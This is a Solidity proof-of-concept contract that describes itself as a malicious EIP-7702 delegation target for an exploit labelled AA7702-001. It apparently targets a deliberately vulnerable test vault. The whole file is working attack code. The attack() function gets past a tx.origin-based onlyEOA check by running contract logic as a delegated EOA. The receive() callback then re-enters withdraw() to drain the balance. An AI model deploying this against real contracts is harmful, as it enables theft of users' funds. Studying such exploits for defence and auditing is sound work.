// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {VulnerableVault} from "./VulnerableVault.sol";

/// @title DelegationTarget — Malicious delegation target for AA7702-001 exploit
/// @notice An EOA delegates to this contract via EIP-7702. When the EOA calls
///         `attack()`, it executes AS the EOA (tx.origin == msg.sender == EOA),
///         bypassing the onlyEOA modifier while running contract logic.
contract DelegationTarget {
    VulnerableVault public immutable vault;

    constructor(VulnerableVault _vault) {
        vault = _vault;
    }

    /// @notice Called by the delegated EOA. tx.origin == msg.sender == EOA address.
    ///         The vault's onlyEOA check passes, but we're executing contract logic.
    function attack() external {
        // Step 1: Withdraw all funds from vault (onlyEOA passes because
        // tx.origin == msg.sender for the delegated EOA)
        uint256 balance = vault.balances(address(this));
        if (balance > 0) {
            vault.withdraw(balance);
        }
    }

    /// @notice Reentrancy callback — when vault sends ETH, we re-enter
    receive() external payable {
        uint256 remaining = vault.balances(address(this));
        if (remaining > 0) {
            vault.withdraw(remaining);
        }
    }
}
